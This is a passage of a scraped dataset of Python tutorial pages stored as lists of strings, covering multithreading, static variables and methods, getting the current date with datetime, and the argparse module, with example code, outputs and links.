halts the execution of the main thread and waits until the thread t1 is completely executed. Once the t1 is successfully executed, the main thread starts its execution.']","['Multithreading is a threading technique in Python programming to run multiple threads concurrently by rapidly switching between threads with a CPU help (called context switching). Besides, it allows sharing of its data space with the main threads inside a process that share information and communication with other threads easier than individual processes. Multithreading aims to perform multiple tasks simultaneously, which increases performance, speed and improves the rendering of the application.', ""It is a very useful technique for time-saving and improving the performance of an application. Multithreading allows the programmer to divide application tasks into sub-tasks and simultaneously run them in a program. It allows threads to communicate and share resources such as files, data, and memory to the same processor. Furthermore, it increases the user's responsiveness to continue running a program even if a part of the application is the length or blocked."", 'It is a thread synchronization mechanism that ensures no two threads can simultaneously execute a particular segment inside the program to access the shared resources. The situation may be termed as critical sections. We use a race condition to avoid the critical section condition, in which two threads do not access resources at the same time.']","['thread.start_new_thread ( function_name, args[, kwargs] )', 'import thread # import the thread module', 'import time # import time module', 'def cal_sqre(num): # define the cal_sqre function', 'print("" Calculate the square root of the given number"")', 'for n in num:', 'time.sleep(0.3) # at each iteration it waits for 0.3 time', ""print(' Square is : ', n * n)"", 'def cal_cube(num): # define the cal_cube() function', 'print("" Calculate the cube of  the given number"")', 'for n in num:', 'time.sleep(0.3) # at each iteration it waits for 0.3 time', 'print("" Cube is : "", n * n *n)', 'arr = [4, 5, 6, 7, 2] # given array', 't1 = time.time() # get total time to execute the functions', 'cal_sqre(arr) # call cal_sqre() function', 'cal_cube(arr) # call cal_cube() function', 'print("" Total time taken by threads is :"", time.time() - t1) # print the total time', 'import threading', 'import threading', 'def print_hello(n):', 'print(""Hello, how old are you "", n)', 't1 = threading.Thread( target = print_hello, args =(18, ))', 't1.start()', 't2.start()', 'import threading', 'def print_hello(n):', 'Print(""Hello, how old are you? "", n)', 'T1 = threading.Thread( target = print_hello, args = (20, ))', 'T1.start()', 'T1.join()', 'Print(""Thank you"")', 'import time # import time module', 'import threading', 'from threading import *', 'def cal_sqre(num): # define a square calculating function', 'print("" Calculate the square root of the given number"")', 'for n in num: # Use for loop', 'time.sleep(0.3) # at each iteration it waits for 0.3 time', ""print(' Square is : ', n * n)"", 'def cal_cube(num): # define a cube calculating function', 'print("" Calculate the cube of  the given number"")', 'for n in num: # for loop', 'time.sleep(0.3) # at each iteration it waits for 0.3 time', 'print("" Cube is : "", n * n *n)', 'ar = [4, 5, 6, 7, 2] # given array', 't = time.time() # get total time to execute the functions', '#cal_cube(ar)', '#cal_sqre(ar)', 'th1 = threading.Thread(target=cal_sqre, args=(ar, ))', 'th2 = threading.Thread(target=cal_cube, args=(ar, ))', 'th1.start()', 'th2.start()', 'th1.join()', 'th2.join()', 'print("" Total time taking by threads is :"", time.time() - t) # print the total time', 'print("" Again executing the main thread"")', 'print("" Thread 1 and Thread 2 have finished their execution."")']","['Calculate the square root of the given number', 'Square is:  16', 'Square is:  25', 'Square is:  36', 'Square is:  49', 'Square is:  4', 'Calculate the cube of the given number', 'Cube is:  64', 'Cube is:  125', 'Cube is:  216', 'Cube is:  343', 'Cube is:  8', 'Total time taken by threads is: 3.005793809890747', 'Hello, how old are you? 20', 'Thank you', 'Calculate the square root of the given number', 'Calculate the cube of the given number', 'Square is:  16', 'Cube is:  64', 'Square is:  25', 'Cube is:  125', 'Square is:  36', 'Cube is:  216', 'Square is:  49', 'Cube is:  343', 'Square is:  4', 'Cube is:  8', 'Total time taken by threads is: 1.5140972137451172', 'Again executing the main thread', 'Thread 1 and Thread 2 have finished their execution.']","[""Methods|||Description&&&start()|||A start() method is used to initiate the activity of a thread. And it calls only once for each thread so that the execution of the thread can begin. &&&run()|||A run() method is used to define a thread's activity and can be overridden by a class that extends the threads class.&&&join()|||A join() method is used to block the execution of another code until the thread terminates.""]",['|||Target: It defines the function name that is executed by the thread.|||Args: It defines the arguments that are passed to the target function name.|||&&&|||It ensures effective utilization of computer system resources.|||Multithreaded applications are more responsive.|||It shares resources and its state with sub-threads (child) which makes it more economical.|||It makes the multiprocessor architecture more effective due to similarity.|||It saves time by executing multiple threads at the same time.|||The system does not require too much memory to store multiple threads.||||||The thread module|||The threading module|||']
157,['Static in Python'],"['The static variable and static method are the widely used programming concepts in various languages such as C++, PHP, Java, etc. These variables and methods belong to the class and the objects. In this section, we will learn how we create static variables and methods in Python.']","['https://www.javatpoint.com/how-to-get-the-current-date-in-python', 'https://www.javatpoint.com/multithreading-in-python-3', 'https://www.javatpoint.com/https://www.javatpoint.com/cpp-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/php-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/java-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://www.javatpoint.com/python-variables', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-get-the-current-date-in-python', 'https://www.javatpoint.com/multithreading-in-python-3', 'https://www.javatpoint.com/how-to-get-the-current-date-in-python']",[],[],"['Python Static Variable', 'Static Method', 'Using the staticmethod() Method', 'Using the @staticmethod Decorator']","['Access the static variable using the same class object', 'Features of static methods', 'Access a static method using the same class object', 'Function returns a value using the static method']","['Note: A @staticmethod is a modern approach to define a method as a static method, and most of the programmer uses this approach in Python programming.']","[""Let's consider a program to demonstrate the use of static variables in the Python."", 'We can directly access a static variable in Python using the same class object with a dot operator.', ""Let's consider a program to access the static variable in Python using the same class object."", 'staticVar.py', 'Following are the features of the static method:', 'There are the two ways to define a static method in Python:', 'A staticmethod() is a built-in function in Python that is used to return a given function as a static method.', 'A staticmethod() takes a single parameter. Where the passed parameter is a function that needs to be converted to a static method.', ""Let's consider a program to create a function as a static method using staticmethod() in Python."", 'staticMethod.py', ""Let's create a program to define the static method using the @staticmethod decorator in Python."", 'staticFun.py', 'Consider a program to access the static method of the class using the @staticmethod in Python.', ""Let's write a program to return a value using the @staticmethod in Python."", 'Static_method.py']","['In the above example, the dept is a class variable defined outside of the class methods and inside the class definition. Where name and id are the instance variable that is defined inside a method.', 'In the above program, we declared the Math_num method, Sci_num method, and Eng_num method as static method outside the class using staticmethod() function. After that, we can call the static method directly using the class name Marks.', 'A @staticmethod is an inbuilt decorator that defines the static method inside the class. It does not receive any argument as a reference to a class instance or a class calling the static method itself.']","['When we declare a variable inside a class, but outside the method, it is called a static or class variable. It can be called directly from a class but not through the instances of a class. However, the static variables are quite different from the other member, and it does not conflict with the same variable name in the Python program.', ""Python has a static method that belongs to the class. It is just like a static variable that bounds to the class rather than the class's object. A static method can be called without creating an object for the class. It means we can directly call the static method with the reference of the class name. Furthermore, a static method is constrained with a class; hence it cannot change the state of an object.""]","['class Employee: # create Employee class name', ""dept = 'Information technology'  # define class variable"", 'def __init__(self, name, id):', 'self.name = name       # instance variable', 'self.id = id             # instance variable', '# Define the objects of Employee class', ""emp1 = Employee('John', 'E101')"", ""emp2 = Employee('Marcus', 'E105')"", 'print (emp1.dept)', 'print (emp2.dept)', 'print (emp1.name)', 'print (emp2.name)', 'print (emp1.id)', 'print (emp2.id)', '# Access class variable using the class name', 'print (Employee.dept) # print the department', '# change the department of particular instance', ""emp1.dept = 'Networking'"", 'print (emp1.dept)', 'print (emp2.dept)', '# change the department for all instances of the class', ""Employee.dept = 'Database Administration'"", 'print (emp1.dept)', 'print (emp2.dept)', 'class Car:', '# define the class variable or static variable of class Car', 'num = 7', ""msg = 'This is a good Car.'"", '# create the object of the class', 'obj = Car()', '# Access a static variable num using the class name with a dot operator.', 'print (""Lucky No."", Car.num)', 'print (Car.msg)', 'staticmethod (function)', 'class Marks:', 'def Math_num(a, b): # define the static Math_num() function', 'return a + b', 'def Sci_num(a, b): # define the static Sci_num() function', 'return a +b', 'def Eng_num(a, b):  # define the static Eng_num() function', 'return a +b', '# create Math_num as static method', 'Marks.Math_num = staticmethod(Marks.Math_num)', '# print the total marks in Maths', 'print ("" Total Marks in Maths"" , Marks.Math_num(64, 28))', '# create Sci_num as static method', 'Marks.Sci_num = staticmethod(Marks.Sci_num)', '# print the total marks in Science', 'print ("" Total Marks in Science"" , Marks.Sci_num(70, 25))', '# create Eng_num as static method', 'Marks.Eng_num = staticmethod(Marks.Eng_num)', '# print the total marks in English', 'print ("" Total Marks in English"" , Marks.Eng_num(65, 30))', 'class Abc:', '@staticmethod', 'def function_name (arg1, arg2, ?):', '# Statement to be executed', 'Returns: a static method for function function_name', 'class Marks:', '@staticmethod', 'def Math_num(a, b): # define the static Math_num() function', 'return a + b', '@staticmethod', 'def Sci_num(a, b): # define the static Sci_num() function', 'return a +b', '@staticmethod', 'def Eng_num(a, b):  # define the static Eng_num() function', 'return a +b', '# print the total marks in Maths', 'print ("" Total Marks in Maths"" , Marks.Math_num(64, 28))', '# print the total marks in Science', 'print ("" Total Marks in Science"" , Marks.Sci_num(70, 25))', '# print the total marks in English', 'print ("" Total Marks in English"" , Marks.Eng_num(65, 30))', 'class Test:', '# define a static method using the @staticmethod decorator in Python.', '@staticmethod', 'def beg():', 'print (""Welcome to the World!! "")', '# create an  object of the class Test', 'obj = Test()', '# call the static method', 'obj.beg()', 'class Person:', '@staticmethod', 'def Age (age):', 'if (age <= 18): # check whether the Person is eligible to vote or not.', 'print (""The person is not eligible to vote."")', 'else:', 'print (""The person is eligible to vote."")', 'Person.Age(17)']","['Information technology', 'Information technology', 'John', 'Marcus', 'E101', 'E105', 'Information technology', 'Networking', 'Information technology', 'Networking', 'Database Administration', 'Lucky No. 7', 'This is a good Car', 'Total Marks in Maths 92', 'Total Marks in Science 95', 'Total Marks in English 95', 'Total Marks in Maths 92', 'Total Marks in Science 95', 'Total Marks in English 95', 'Welcome to the World!!', 'The person is not eligible to vote.']",[],['|||A static method in Python related to the class.|||It can be called directly from the class by reference to a class name.|||It cannot access the class attributes in the Python program.|||It is bound only to the class. So it cannot modify the state of the object|||It is also used to divide the utility methods for the class.|||It can only be defined inside a class but not to the objects of the class.|||All the objects of the class share only one copy of the static method.||||||Using the staticmethod() Method|||Using the @staticmethod Decorator|||']
158,['How to get the current date in Python?'],"[""In this section, we will understand how we can retrieve Python's current date using various methods. A date is an important part of an application or website, or database server that indicates the day and time the software has been created, stored website records, app version, etc. For example, when a user uses the applications or website for certain work, the software stores the user's information with a certain date and time. Furthermore, we can say when we visit any social media site such as Twitter, Facebook, WhatsApp, etc. they store the user's information on which date the particular user's post, share or send the message, etc. So, we can define the importance of the date and time in the software application.""]","['https://www.javatpoint.com/argparse-in-python', 'https://www.javatpoint.com/static-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/argparse-in-python', 'https://www.javatpoint.com/static-in-python', 'https://www.javatpoint.com/argparse-in-python']",['https://static.javatpoint.com/python/images/how-to-get-the-current-date-in-python.png'],[],"['Using the datetime.now() Method', 'Using the now() Method', 'Using date.today() Method', 'Using the now().date() Function', 'Using the now().time() Function', 'Using the strftime() Function']","['Attributes of the now() Method', 'Date and Time Formats in Python']",['Note: It returns the current date of the system in string format by importing the datetime module in Python programming.'],"[""In the Python programming language, the datetime module contains a datetime class used to access the computer's current date and time."", 'Consider a program to access the current date and time of the system using the datetime.now() method in Python.', 'program.py', 'now() method: Python now() method is used to display the current date of the system.', 'Consider a program to access the current date and time of the system using the now() method in Python.', 'Program.py', 'Python now() method has various attributes similar to the time attributes such as year, month, date, hour, minute, and second.', ""Let's create a program to demonstrate the different attributes of the now() method to print the date in Python."", 'Program2.py', ""Let's consider a program to display the system's current date using the today() method of date class."", 'A now().date() method used to access the local or current date of the system by importing the datetime module in Python.', ""Lets' write a program to print the system's current date using the datetime.now().date() method in Python."", 'Program3.py', 'A now().time() method used to access the local or current time of the system by importing the time() method from the datetime module in Python.', ""Lets' write a program to print the system's current time using the datetime.now().time() method in Python."", ""Let's create a Python program and use the above described formats."", ""Let's create a program to display current date and time using the strftime() function."", 'Strftime.py']","[""Python datetime.now() method used to display the system's current date and time. It defines the function inside the datetime module of the Python library."", ""A date module class present in the datetime module to return a date object that contains the value of today's date. Where a today() method is used to get the today date in the Python program."", 'Following are the various format of date and time to get the desired representation of datetime in Python by passing the parameters to the strftime () function.']",[],"['datetime.now()', 'import datetime', 'dt = datetime.datetime.now() # use now() method in datetime', 'print( ""Display the current date of the system: "") # current date', 'print (str (dt) ) # call the dt variable to print the system date.', 'now() # fetch the current date', '# import the datetime class or module from the datetime module.', 'from datetime import datetime', 'now = datetime.now() # Use now() to access the current date and time', 'print(""Current date and time is "", now)', '# importing the datetime module for now() method', 'import datetime', '# Use datetime.now() method to get the current date into the variable current_date', 'current_date = datetime.datetime.now()', '# print the message for now() attributes in Python', 'print ("" Following are the attributes of now() function are : "")', '# print the current year of the system', 'print("" The current year is : "", end = """" )', 'print (current_date.year)', '# print the current month of the system', 'print( "" The current month is : "", end = """" )', 'print (current_date.month)', '# print the current date of the system', 'print( "" The current date is : "", end = """" )', 'print (current_date.day)', 'date.today()', 'from datetime import date', 'td = date.today() # Use the today method and assign it to the td variable.', 'print("" Get the today date in Python is: "", td)', 'Current_date = datetime.now().date()', 'from datetime import datetime', '#  Return the current date of the system', 'Current_date = datetime. now(). date()', 'print(""The current date is :"", Current_date)', 'Current_date = datetime.now().time()', 'from datetime import datetime', '# Return the current date and time of the system', 'Current_time = datetime.now().time()', 'print(""Current time is :"", Current_time)', 'import datetime', 'dt = datetime.datetime.now()', 'print (""Current date and time is = %s"" % dt)', 'print (""Date and time in ISO Format = %s"" % dt.isoformat())', 'print (""Current year = %s"" %dt.year)', 'print (""Current month is = %s"" %dt.month)', 'print (""Current date (day) = %s"" %dt.day )', 'print (""represent Date in dd/mm/yyyy format = %s / %s/ %s"" % (dt.day, dt.month, dt.year))', 'print (""Current hour is = %s"" %dt.hour)', 'print ("" Current minute is = %s"" %dt.minute)', 'print (""Current Second is = %s"" %dt.second)', 'print (""Representation of time in hh: mm: ss format = %s: %s: %s"" % (dt.hour, dt.minute, dt.second))', 'import datetime', 'dt  = datetime.datetime.now()', 'print (dt.strftime (""%Y - %m - %d %H: %M: %S "" )) # represents the date YYYY- MM - DD', '# HH: MM: SS', 'print (dt.strftime (""%d / %m / %Y "")) # represents the date in DD/ MM/ YYYY', 'print (dt.strftime ("" %I: %M: %S %p "")) # represents the time in HH: MM: SS AM/ PM', 'print (dt.strftime (""%a, %b %d, %Y "")) # represents the day, month date and year']","['Display the current date of the system:', '2021-02-28 18:56:52.799555', 'Current date and time is 2021-02-28 18:58:33.237779', 'Following are the attributes of now() function are :', 'The current year is: 2021', 'The current month is: 2', 'The current date is: 28', 'Get the today date in Python is:  2021-02-28', 'The current date is : 2021-02-28', 'Current time is: 19:07:45.787512', 'Current date and time is = 2021-02-28 19:09:03.739466', 'Date and time in ISO Format = 2021-02-28T19:09:03.739466', 'Current year = 2021', 'Current month is = 2', 'Current date (day) = 28', 'Represent Date in dd/mm/yyyy format = 28 / 2/ 2021', 'Current hour is = 19', 'Current minute is = 9', 'Current Second is = 3', 'Representation of time in hh: mm: ss format = 19: 9: 3', '2021 - 02 - 28 19: 12: 06', '28 / 02 / 2021', '07: 12: 06 PM', 'Sun, Feb 28, 2021']","['Directive|||Description|||Example&&&%a|||Display the abbreviate weekday name.|||Sun, Mon, …&&&%A|||Display the full weekday name.|||Sunday, Monday, ..&&&%b|||Display the abbreviate month name.|||Jan, Feb, …, Dec&&&%B|||Display the full month\'s name.|||January, February, … December&&&%c|||It is used to position the appropriate date and time representation.|||Sun Feb 21 07:05: 28 2021&&&%d|||Display the day of the month in the zero-padded decimal format.|||01, 02, …, 28, 30, 31&&&%H|||Display the hour (24-hour clock) in the format of a zero-padded decimal number.|||00, 01, …, 23&&&%I|||It represents the hour (12-hour clock) as a decimal number.|||01, 02, …, 12&&&%j|||Display the day of the year in the form of a zero-padded decimal number.|||001, 002, …, 999&&&%m|||Display the month in the form of a zero-padded decimal number.|||01, 02, …, 12&&&%M|||Display the Minute in the form of a zero-padded decimal number.|||00, 01, .., 59&&&%p|||It is used to position the equivalent of either AM or PM.|||AM, PM&&&%S|||Display the second in the form of a zero-padded decimal number.|||00, 01, …, 59&&&%U|||Count the Sunday as the first day of the week number in the year, and it displays the day in the decimal number.|||00, 01, …, 53&&&%w|||It is used to locate the weekday as a decimal number where Sunday starts with 0.|||00, 01, …, 53&&&%W|||Count the Monday as the first day of the week number in the year, and it displays the day in the decimal number.|||00, 01, …, 53&&&%x|||It is used to locate the appropriate representation of the date.|||19- 02 - 2021&&&%X|||It is used to locate the appropriate representation of the time.|||07 : 41: 29&&&%y|||Display the year format without containing century in the form of a decimal number.|||0, 1, .., 99&&&%Y|||Display the year containing century in the form of a decimal number.|||2014, 2019, etc.&&&%z|||It represents the UTC offset in the form +HHMM or - HHMM.|||&&&%Z|||It is basically used to represent the time zone name (It does not contain any characters if no time zone exists).|||&&&%%|||It just represents a literal ""%"" character.|||%']",[]
159,['The argparse in Python'],"['In this article, we will learn the argparse module in Python. We will explore its working and functionalities. It is a very important topic for the fundamental developer, engineer, and computer scientist. As we all familiar, Python is popular for containing and rich library. If the developer writes the script for the command line, he/she is also required to pass the command-line argument that we can create using the argparse library.']","['https://www.javatpoint.com/python-tqdm-module', 'https://www.javatpoint.com/how-to-get-the-current-date-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/linux-ls', 'https://www.javatpoint.com/https://www.javatpoint.com/getopt-module-in-python', 'https://www.javatpoint.com/python-tqdm-module', 'https://www.javatpoint.com/how-to-get-the-current-date-in-python', 'https://www.javatpoint.com/python-tqdm-module']","['https://static.javatpoint.com/python/images/argparse-in-python.png', 'https://static.javatpoint.com/python/images/argparse-in-python2.png', 'https://static.javatpoint.com/python/images/argparse-in-python3.png', 'https://static.javatpoint.com/python/images/argparse-in-python4.png', 'https://static.javatpoint.com/python/images/argparse-in-python5.png', 'https://static.javatpoint.com/python/images/argparse-in-python6.png']",[],"['What is argparse in Python?', 'How to implement the argparse library to create a command-line interface?', 'Types of Argument in Command Line Interface', 'Python argparse Positional Argument', 'Python argparse Positional Argument Default Values', 'Using Short Name for Optional Argument', 'Conclusion']","['What is command line interface?', 'How does the command line interface work?', 'Combining Optional and Positional Arguments with argparse']",[],"['In this article, we will explore the following topics related to argparse.', ""Let's understand what is argparse is and how we can implement it."", 'As we can see in the above output, the ls command returns many files that are available in the current directory.', 'Now, we will run the ls command by adding option -l to the command line.', ""Let's see the following simple example to understand the working of the argparse module in Python."", 'To run this program, we open the command-line interface and run the above file.', 'When we press enter, it will show the following output.', ""As we can see, it shows error because we didn't pass the required argument."", 'Now, we will pass the optional argument - h which is basically used for help.', 'It will show the following output.', 'We print the argument to the console using the args variable. By default, it takes input as so we need to typecast into integer.', 'To add these two numbers, we define the add operation in our code.', 'Example - 1 Simple Calculator Program using argparse', 'There are two arguments that we can add to the command-line interface.', ""Let's understand the both arguments."", 'By default, the positional arguments are treated as String, however we can typecast in other data types.', 'In the previous example, we have used positional arguments to perform the add operation between the two numbers.', ""Let's understand the following code."", 'Example - 1', 'We have passed 15 and it returned 1515 because argparse treated as string. We can correct this using the type attribute.', 'Now, we get the desired result.', ""Let's understand the following example."", 'When we run the above code without passing any arguments, it will show the following output.', ""Sometimes, we need the arguments that are mandatory to be passed in the script on execution. Let's see an example it not passed."", 'When we run the above code with the different parameter, it will show the following argument.', 'We can show the error if the argument is not passed in the command line terminal.', ""Let's understand the following example."", 'In the above code, we have assigned the short to both optional arguments. We can access it by using its short name.', ""We can combine both optional and position arguments using the argparse as follows. Let's understand the following example."", 'We have passed both types of argument to the command-line and get the above output.', 'This module helps us create self-explanatory programs and provide users with a means of interacting with our application.']","['The command-line interface is also known as the CLI, which interacts with a command-line script. Python provides many libraries that allow us to work with the CLI, but Python argparse is the most suitable library in the current scenario.', 'Before getting deep down into this topic, we need to understand how the command line interface works? So open the command line terminal and type the ls command to get the entire list of files available in the system.', 'Python argparse is a command-line parsing module that is recommended to work with the command line argument. This module was released as a part of the standard library with Python on 20th February 2011.', 'Example - In the following example, we create a simple Python program to perform the add operation using the argparse module. We will pass the argument through the command-line interface.', 'We have imported the argparse module and created a simple parser that will use throughout the program. We have called the add_argument() method and pass two arguments - num1 and help. We have saved the above code in the file named code.py.', 'As we can see in the above code, we ran the script without passing any optional argument and instead of returning error it returns none. The help message and data types for optional parameters are same as in positional parameters.', ""We can provide the default value to a variable or argument using the argparse module. In the previous example, positional argument value is empty when not provided. Let's understand the following example."", 'Passing the many optional can make our Python script long. So we can assign the short name to the parameters as well. We can give the abbreviation name to parameters; it will help us to keep our Python script short.']","['It is similar to the getopt module, but it is slightly hard to use and requires more code lines to perform the same task. However, the argparse module is the better replacement of the Python getopt and optparse module. It provides a few important features that are given below.', 'We get all the arguments list which we have defined in our Python program. Now, we will print both arguments and the operation by adding the following operation. When we execute the .parse_args(), we get a Namespace object containing a simple property of each input argument received from the command line.', ""Positional Argument - Positional arguments are the types of argument that we use in command to operate. We pass the argument to the command and perform some operations. Their position defines by their function. That's why they are called a positional argument."", 'Optional Argument - Optional Argument are not mandatory. We will not get the error if not passed to the script. These types of arguments are started with the - single dash or ""--"" double dash prefix. We need to call the .add_parse() to pass the optional arguments.', 'So far, we have discussed all-important concept of the argparse Python module. We have learned how we can create them and how we can use them through the command-line interface. We have also learned what the argparse module is and why it is important to write command-line scripts in Python.']","['C:\\Users\\DEVANSH SHARMA>ls', 'C:\\Users\\DEVANSH SHARMA>ls -l', '# importing argparse module', 'import argparse', 'parser = argparse.ArgumentParser()', '# creating two variables using the add_argument method', 'parser.add_argument(""num1"", help = ""first number"")', 'parser.add_argument(""num2"", help = ""second number"")', 'parser.add_argument(""operation"", help = ""operation"")', 'C:\\Users\\DEVANSH SHARMA\\PycharmProjects\\Elasticsearch>python code.py', 'C:\\Users\\DEVANSH SHARMA\\PycharmProjects\\Elasticsearch>python code.py -h', 'args = parser.parse_args()', 'print(args.num1)', 'print(args.num2)', 'print(args.operation)', 'n1 = int(args.num1)', 'n2 = int(args.num2)', 'result = n1 + n2', 'print(""The Result is : "",result)', '# importing argparse module', 'import argparse', 'parser = argparse.ArgumentParser()', '# creating two variables using the add_argument method', 'parser.add_argument(""num1"", help = ""first number"")', 'parser.add_argument(""num2"", help = ""second number"")', 'parser.add_argument(""operation"", help = ""operation"")', 'args = parser.parse_args()', 'print(args.num1)', 'print(args.num2)', 'print(args.operation)', 'n1 = int(args.num1)', 'n2 = int(args.num2)', 'if args.operation == ""add"":', 'result = n1 + n2', 'print(""The Result is : "",result)', 'elif args.operation == ""sub"":', 'result = n1 - n2', 'elif args.operation == ""mul"":', 'result = n1 * n2', 'elif args.operation == ""div"":', 'result = n1 / n2', 'print(""Unmatched Argument"")', 'print(""result is : "",result)', 'import argparse', 'parser = argparse.ArgumentParser()', '# By default, it treats input number as string', 'parser.add_argument(\'num\', help=""Enter nmber to get square of it."")', 'args = parser.parse_args()', 'print(args.num**2)', 'import argparse', 'parser = argparse.ArgumentParser()', 'parser.add_argument(\'num\', help=""Enter number to get square of it."", type = int)', 'args = parser.parse_args()', 'print(args.num**2)', '# importing argparse module', 'import argparse', 'parser = argparse.ArgumentParser()', '# creating two variables using the add_argument method', 'parser.add_argument(""--num1"", help = ""first number"")', 'parser.add_argument(""--num2"", help = ""second number"")', 'parser.add_argument(""--operation"", help = ""operation"")', 'args = parser.parse_args()', 'print(args.num1)', 'print(args.num2)', 'print(args.operation)', 'n1 = int(args.num1)', 'n2 = int(args.num2)', 'if args.operation == ""add"":', 'result = n1 + n2', 'print(""The Result is : "",result)', 'elif args.operation == ""sub"":', 'result = n1 - n2', 'elif args.operation == ""mul"":', 'result = n1 * n2', 'elif args.operation == ""div"":', 'result = n1 / n2', 'print(""Unmatched Argument"")', 'print(""result is : "",result)', 'import argparse', 'parser = argparse.ArgumentParser()', 'parser.add_argument(""example"")', 'args = parser.parse_args()', ""if args.example == 'Hello Python':"", ""print('Welcome to Javatpoint')"", 'print(""Didn\'t make it!"")', 'import argparse', 'parser = argparse.ArgumentParser()', 'parser.add_argument(""example"", default = ""Hello How are you"")', 'args = parser.parse_args()', ""if args.example == 'Hello':"", ""print('Welcome to Javatpoint')"", 'print(""Didn\'t make it!"")', 'import argparse', 'parser = argparse.ArgumentParser()', 'parser.add_argument(\'-tut\', \'--tutorial\', help=""Best Tutorial "")', 'parser.add_argument(\'-w\', \'--writer\', help=""Technical Content"")', 'args = parser.parse_args()', ""if args.tutorial == 'Javatpoint':"", ""print('Congratulation|| You made it!')"", ""if args.writer == 'Devansh':"", ""print('Technical Writer.')"", 'import argparse', 'parser = argparse.ArgumentParser()', '# positionl Argument', 'parser.add_argument(\'tutorial\', help=""Best Tutorial "")', '# optional argument', 'parser.add_argument(\'-w\', \'--writer\', help=""Technical Content"")', 'args = parser.parse_args()', ""if args.tutorial == 'Javatpoint':"", ""print('You made it!')"", ""if args.writer == 'Devansh':"", ""print('Technical Writer.')""]","['face.png', 'Favorites', 'file1.txt', 'file2.txt', 'flower.jpg', 'forest.jpg', 'Gow-0.8.0.exe', 'gradients.jpg', 'hadoop-2.8.0', 'hadoop-2.8.0.tar.gz', 'hello_fullstack', 'highway.mp4', 'IBA_IOAPDATA', 'innocentcat', 'IntelGraphicsProfiles', 'international-cricket-players-data.zip', 'Iris.csv', 'iris.zip', 'java_error_in_pycharm_6408.log', 'java_error_in_pycharm_6684.log', 'jtp_logo.png', 'linear_reg', 'linear_reg.zip', 'Links', 'Local Settings', 'main_image.jpg', 'mario.png', 'metastore_db', 'MicrosoftEdgeBackups', 'Music', 'My Documents', 'mycus', '9c409ba1dd3f}.TMContainer00000000000000000001.regtrans-ms', 'NTUSER.DAT{42939bbc-edb6-11ea-9c24-9c409ba1dd3f}.TMContainer00000000000000000002.regtrans-ms', 'ntuser.ini', 'PySpark DataFrame.ipynb', 'PySpark RDD.ipynb', 'PySpark SQL.ipynb', 'PySpark UDF.ipynb', 'tesseract-3.02.02-win32-lib-include-dirs', 'tesseract-3.02.02-win32-lib-include-dirs.zip', 'total 717704', 'drw-rw-rw-   2 DEVANSH SHARMA 0         0 2020-04-07 13:25 __pycache__', 'dr--r--r--   2 DEVANSH SHARMA 0         0 2020-09-03 13:42 3D Objects', 'drw-rw-rw-   2 DEVANSH SHARMA 0         0 2014-01-03 15:37 8235702-a50f7c449c41b6dc8eb87d8d393eeff62121b392', 'drw-rw-rw-  20 DEVANSH SHARMA 0     32768 2020-12-07 16:20 Anaconda3', 'drw-rw-rw-   5 DEVANSH SHARMA 0         0 2020-09-03 13:02 AppData', 'drw-rw-rw-   2 DEVANSH SHARMA 0      8192 2021-02-11 21:39 Application Data', '-rw-rw-rw-   1 DEVANSH SHARMA 0       224 2019-11-13 14:38 array.mat', '-rw-rw-rw-   1 DEVANSH SHARMA 0     69548 2019-12-03 14:18 ballon.jpg', '-rw-rw-rw-   1 DEVANSH SHARMA 0     69548 2019-12-03 14:20 baloon.jpg', '-rw-rw-rw-   1 DEVANSH SHARMA 0      1857 2019-10-15 12:16 binary.png', '-rw-rw-rw-   1 DEVANSH SHARMA 0         5 2020-04-01 16:46 binfile.bin', '-rw-rw-rw-   1 DEVANSH SHARMA 0     13911 2019-10-16 11:52 blob.jpg', '-rw-rw-rw-   1 DEVANSH SHARMA 0    244879 2019-10-14 14:19 book1.jpg', '-rw-rw-rw-   1 DEVANSH SHARMA 0     10064 2020-04-07 16:35 calculation.py', '-rw-rw-rw-   1 DEVANSH SHARMA 0     23073 2019-12-06 15:30 calibresult.jpg', '-rw-rw-rw-   1 DEVANSH SHARMA 0       336 2019-11-29 15:11 cat.jpeg', '-rw-rw-rw-   1 DEVANSH SHARMA 0         0 2019-12-05 12:34 cat.jpg', '-rw-rw-rw-   1 DEVANSH SHARMA 0     13001 2019-10-13 17:22 cat_16x9.jpg', '-rw-rw-rw-   1 DEVANSH SHARMA 0    249726 2019-10-13 15:02 cat1.jpg', '-rw-rw-rw-   1 DEVANSH SHARMA 0      5633 2019-12-04 11:16 coin.jpg', '-rw-rw-rw-   1 DEVANSH SHARMA 0      8652 2019-12-04 11:23 coin1.png', '-rw-rw-rw-   1 DEVANSH SHARMA 0     59918 2020-03-02 11:22 comic.png', 'dr--r--r--   2 DEVANSH SHARMA 0         0 2020-09-03 13:42 Contacts', 'usage: code.py [-h] num1 num2 operation', 'code.py: error: the following arguments are required: num1, num2, operation', 'usage: code.py [-h] num1 num2 operation', 'positional arguments:', 'num1        first number', 'num2        second number', 'operation   operation', 'optional arguments:', '-h, --help  show this help message and exit', 'C:\\Users\\DEVANSH SHARMA\\PycharmProjects\\Elasticsearch>python code.py 20 30 add', '20', '30', 'add', 'The Result is :  50', 'C:\\Users\\DEVANSH SHARMA\\PycharmProjects\\Elasticsearch>python code.py -w Devansh', 'Technical Writer.', 'C:\\Users\\DEVANSH SHARMA\\PycharmProjects\\Elasticsearch>python code.py Javatpoint -w Devansh', 'You made it!', 'Technical Writer.']",[],['|||What is the command-line interface?|||What is argparse in Python?|||How to implement Python argparse library to create a command-line interface?|||Types of Arguments in Command-line Interface|||Python argparse Positional Argument|||Python argparse Positional Argument Default Values|||Using a short name for Optional Arguments|||Combining Optional and Positional Arguments with argparse|||Conclusion||||||It allows us to use to positional argument.|||It allows us to customize the prefix chars.|||It supports variable numbers of parameters for a single option.|||It supports subcommands.||||||Positional Argument|||Optional Argument|||']
